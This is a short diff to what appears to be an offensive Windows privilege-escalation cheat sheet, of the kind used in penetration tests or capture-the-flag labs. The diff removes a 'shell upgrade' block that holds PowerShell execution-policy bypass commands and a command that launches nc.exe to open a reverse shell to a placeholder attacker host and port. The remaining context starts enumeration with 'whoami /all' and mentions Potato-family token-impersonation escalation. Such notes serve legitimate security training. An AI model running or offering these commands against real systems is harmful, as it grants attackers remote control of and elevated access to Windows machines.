@@ -1,10 +1,3 @@
-# === SHELL UPGRADE ===
-# Upgrade cmd to PowerShell immediately
-powershell -ep bypass
-powershell -NoProfile -ExecutionPolicy Bypass
-# Spawn new reverse shell from existing limited shell
-powershell -c "Start-Process -NoNewWindow -FilePath 'C:\Windows\Temp\nc.exe' -ArgumentList '{{KALI}} {{KALI_PORT}} -e cmd'"
-
 # === PHASE 1: INSTANT WINS (run ALL before moving on) ===
 # Who am I - SeImpersonate/SeAssignPrimaryToken = Potato family immediately
 whoami /all
